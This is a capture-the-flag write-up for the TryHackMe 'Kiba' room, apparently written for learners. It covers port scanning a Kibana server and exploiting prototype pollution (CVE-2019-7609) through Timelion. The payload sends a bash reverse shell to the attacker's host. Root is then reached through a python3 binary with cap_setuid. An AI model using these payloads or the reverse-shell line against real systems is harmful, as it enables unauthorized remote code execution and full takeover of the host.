# Kiba

[This room](https://tryhackme.com/room/kiba) is based on the vulnerability in a data visualization dashboard for Elasticsearch named Kibana. The questions are structured in a very beginner friendly manner that guides us in the right direction. By the end of this room, we will get a rough idea on how to perform attacks using CVE's.

So, let's begin!

1. ##### What is the vulnerability that is specific to programming languages with prototype-based inheritance?

The first that we do after after deploying our machine is access the IP address and check the content over there. 

![kiba_home](./.images/kiba_home.png)

Below the image, we can see a string that gives us a hint towards something called as `linux capabilities`. So, we can google what it is exactly and the first thing that comes up is that it is `special attributes in the  Linux kernel that grant processes and binary executables specific  privileges that are normally reserved for processes whose effective **user ID** is 0 (The root user, and only the root user, has **UID** 0).`. As we don't have access to the machine this information is not useful right now but can be helpful once we get the machine's access.

On the other side, we can start an nmap scan to determine all the ports that are open on the machine. Meanwhile, we can search for what the first question is asking i.e. a vulnerability related to `prototype-based inheritance programming languages`. With only one google search we can find out the details of this vulnerability which is explained [here](https://github.com/Kirill89/prototype-pollution-explained). Also, the name of this vulnerability is the answer to the first question.

2. ##### What is the version of visualization dashboard installed in the server?

We can now check the results of nmap.

```
tester@kali:~$ nmap -A -p-10000 -T4 10.10.11.31
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-01 20:26 IST
Nmap scan report for 10.10.11.31
Host is up (0.22s latency).
Not shown: 9994 closed ports
PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9d:f8:d1:57:13:24:81:b6:18:5d:04:8e:d2:38:4f:90 (RSA)
|   256 e1:e6:7a:a1:a1:1c:be:03:d2:4e:27:1b:0d:0a:ec:b1 (ECDSA)
|_  256 2a:ba:e5:c5:fb:51:38:17:45:e7:b1:54:ca:a1:a3:fc (ED25519)
80/tcp   open     http           Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
3834/tcp filtered spectardata
4160/tcp filtered jini-discovery
5044/tcp open     lxi-evntsvc?
5601/tcp open     esmagent?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 60
|     connection: close
|     Date: Tue, 01 Sep 2020 14:59:34 GMT
|     {"statusCode":404,"error":"Not Found","message":"Not Found"}
|   GetRequest: 
|     HTTP/1.1 302 Found
|     location: /app/kibana
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     cache-control: no-cache
|     content-length: 0
|     connection: close
|     Date: Tue, 01 Sep 2020 14:59:29 GMT
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 38
|     connection: close
|     Date: Tue, 01 Sep 2020 14:59:30 GMT
|_    {"statusCode":404,"error":"Not Found"}
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5601-TCP:V=7.80%I=7%D=9/1%Time=5F4E61D1%P=x86_64-pc-linux-gnu%r(Get
SF:Request,D4,"HTTP/1\.1\x20302\x20Found\r\nlocation:\x20/app/kibana\r\nkb
SF:n-name:\x20kibana\r\nkbn-xpack-sig:\x20c4d007a8c4d04923283ef48ab54e3e6c
SF:\r\ncache-control:\x20no-cache\r\ncontent-length:\x200\r\nconnection:\x
SF:20close\r\nDate:\x20Tue,\x2001\x20Sep\x202020\x2014:59:29\x20GMT\r\n\r\
SF:n")%r(HTTPOptions,117,"HTTP/1\.1\x20404\x20Not\x20Found\r\nkbn-name:\x2
SF:0kibana\r\nkbn-xpack-sig:\x20c4d007a8c4d04923283ef48ab54e3e6c\r\nconten
SF:t-type:\x20application/json;\x20charset=utf-8\r\ncache-control:\x20no-c
SF:ache\r\ncontent-length:\x2038\r\nconnection:\x20close\r\nDate:\x20Tue,\
SF:x2001\x20Sep\x202020\x2014:59:30\x20GMT\r\n\r\n{\"statusCode\":404,\"er
SF:ror\":\"Not\x20Found\"}")%r(RTSPRequest,1C,"HTTP/1\.1\x20400\x20Bad\x20
SF:Request\r\n\r\n")%r(RPCCheck,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
SF:\r\n")%r(DNSVersionBindReqTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:n\r\n")%r(DNSStatusRequestTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:n\r\n")%r(Help,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SSLSe
SF:ssionReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TerminalSer
SF:verCookie,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TLSSession
SF:Req,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(Kerberos,1C,"HTT
SF:P/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SMBProgNeg,1C,"HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\n\r\n")%r(X11Probe,1C,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\n\r\n")%r(FourOhFourRequest,12D,"HTTP/1\.1\x20404\x20Not\
SF:x20Found\r\nkbn-name:\x20kibana\r\nkbn-xpack-sig:\x20c4d007a8c4d0492328
SF:3ef48ab54e3e6c\r\ncontent-type:\x20application/json;\x20charset=utf-8\r
SF:\ncache-control:\x20no-cache\r\ncontent-length:\x2060\r\nconnection:\x2
SF:0close\r\nDate:\x20Tue,\x2001\x20Sep\x202020\x2014:59:34\x20GMT\r\n\r\n
SF:{\"statusCode\":404,\"error\":\"Not\x20Found\",\"message\":\"Not\x20Fou
SF:nd\"}")%r(LPDString,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(
SF:LDAPSearchReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(LDAPBi
SF:ndReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SIPOptions,1C,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 178.62 seconds
```

From these results, we can see that some service is running on port 5601. So, we can go back to our browser and see that the Kibana dashboard is running at `http://<ip_address:5601/app/kibana'.`

![kibana_welcome](./.images/kibana_welcome.png)

We can select the option 'Try our sample data' and proceed to access the dashboard. As per the question, we need to now look for the version of Kibana running on the machine (which will be helpful further to search for vulnerabilities) which can be found in the management section:

![kibana_management](./.images/kibana_management.png)

We can now submit this version number as the answer to the second question.

3. ##### What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000

Now, that we know the service and it's version we can search for related vulnerabilities. In the beginning we came across a vulnerability related to prototype-based inheritance vulnerability. So, we can look for that kind of vulnerability in Kibana. After some googling, we can find an entire article on this vulnerability which can lead to an RCE [here](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/). We can easily get the CVE number and exploitation method from the same website. As for this question, we can submit the CVE number found on the website as the answer to the third question.

4. ##### Compromise the machine and locate user.txt

In the article it is very beautifully explained about the exploit and how we can perform it. The basic steps that we need to follow in order to exploit are as follows:

 1.  Go to Timelion and enter the following payload:

     ```
     .es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/10.x.x.x/4242 0>&1");process.exit()//')
     .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
     ```

2. Update the IP with our local machine's IP address and port number of our choice and click on the play-like button.

3. Start a listener on the mentioned port on our local machine.

   ```
   tester@kali:~/Downloads$ nc -nvlp 4242
   listening on [any] 4242 ...
   ```

4. Go to Canvas on Kibana dashboad and wait for sometime to get a reverse shell on our listener.

P.S. The above payload on the article did not work for me, so I looked for some other payload and found a git repository over [here](https://github.com/mpgn/CVE-2019-7609) and used those payloads.

```
tester@kali:~/Downloads$ nc -nvlp 4242
listening on [any] 4242 ...
connect to [10.8.91.135] from (UNKNOWN) [10.10.250.78] 41744
bash: cannot set terminal process group (958): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kiba@ubuntu:/home/kiba/kibana/bin$ whoami

kiba
kiba@ubuntu:/home/kiba/kibana/bin$ cd /home/kiba

kiba@ubuntu:/home/kiba$ ls

elasticsearch-6.5.4.deb
kibana
user.txt
kiba@ubuntu:/home/kiba$ cat user.txt
```

This user.txt flag can be submitted as the answer to the fourth question.

5. ##### Capabilities is a concept that provides a security system that allows "divide" root privileges into different values

Though we don't need to give any answer to this question, it definitely gives us a hint that we need to use Linux Capabilities for privilege escalation.

6. ##### How would you recursively list all of these capabilities?

We can simply do a google search to find the answer for this question. After some research we can find [this](https://www.vultr.com/docs/working-with-linux-capabilities?__cf_chl_jschl_tk__=92b3dbab2c797cb4228927692a7bb187a9eeb61a-1598977955-0-AXZZjx81Q8Zt90gyrUYyMTt5KcXg1ndzEH86_mraDiZccs_tLTQ47VIxN5vz0YyLcaPwRhXsCeGJTaj_cAQydOPTLs0wGkzWA3bTIQChlvhjU5xJ-SNS2mCkXNMipUJZaxDpT4QrNmxBzhdxlyu7WJyY20jBHQUxyMsMH-lRvkoNgITcYD_xqmyg-LwPZDEtGatJ5hynYg1qPnY7CgRvsJ-uJhrlrA1Z8TOlZIEsiouWtBjlwn6tvFHpDaE-Ca_hGYSLuvNCSPliBFy7VH_37CuHgruzzCE856o3O8Xv34_Ac7UYW1Ar6Iotot0N7Fk7unjbJINAhZSwCEKVr6__pehxQbMYzBre3pSeXgXQNHj1aA8YvZTlABjAcfcOB-ejxg) website where we can find the simple command using which we can list all the linux capabilities recursively.

Do note that when you run the command add `2> /dev/null` else you'll see a lot of operation not supported results.

```
kiba@ubuntu:/home/kiba/kibana/bin$ getcap -r / 2> /dev/null

/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
```

Here, we can see an odd file `/home/kiba/.hackmeplease/python3`.  On checking it's permission:

```
kiba@ubuntu:/home/kiba/.hackmeplease$ lsls  --lala

total 4356
drwxrwxr-x 2 kiba kiba    4096 Mar 31 22:38 .
drwxr-xr-x 6 kiba kiba    4096 Sep  1 09:49 ..
-rwxr-xr-x 1 root root 4452016 Mar 31 22:38 python3
```

We can see that it is owned by root. So, we can try to use this file to get root access. We can go to [GTFOBins](https://gtfobins.github.io/gtfobins/python/) and check the python capabilities exploit to get root access.

7. ##### scalate privileges and obtain root.txt

Though on GTFOBins the payload is for python 2 we can change it for python3 and use it.

```
./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

And once we execute the command, we will get the root shell:

```
kiba@ubuntu:/home/kiba/.hackmeplease$ ./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'.
     
whoami
root
cat /root/root.txt
```

Now, we can read the root flag and submit it to complete the room!

### Links Referred

1. TryHackMe - Kiba: https://tryhackme.com/room/kiba 
2. Prototype Pollution Explained: https://github.com/Kirill89/prototype-pollution-explained
3. RCE in Kibana: https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/
4. Payloads for Kibana RCE: https://github.com/mpgn/CVE-2019-7609
5. Linux Capabilities Commands: https://www.vultr.com/docs/working-with-linux-capabilities?__cf_chl_jschl_tk__=92b3dbab2c797cb4228927692a7bb187a9eeb61a-1598977955-0-AXZZjx81Q8Zt90gyrUYyMTt5KcXg1ndzEH86_mraDiZccs_tLTQ47VIxN5vz0YyLcaPwRhXsCeGJTaj_cAQydOPTLs0wGkzWA3bTIQChlvhjU5xJ-SNS2mCkXNMipUJZaxDpT4QrNmxBzhdxlyu7WJyY20jBHQUxyMsMH-lRvkoNgITcYD_xqmyg-LwPZDEtGatJ5hynYg1qPnY7CgRvsJ-uJhrlrA1Z8TOlZIEsiouWtBjlwn6tvFHpDaE-Ca_hGYSLuvNCSPliBFy7VH_37CuHgruzzCE856o3O8Xv34_Ac7UYW1Ar6Iotot0N7Fk7unjbJINAhZSwCEKVr6__pehxQbMYzBre3pSeXgXQNHj1aA8YvZTlABjAcfcOB-ejxg
6. GTFOBins: https://gtfobins.github.io/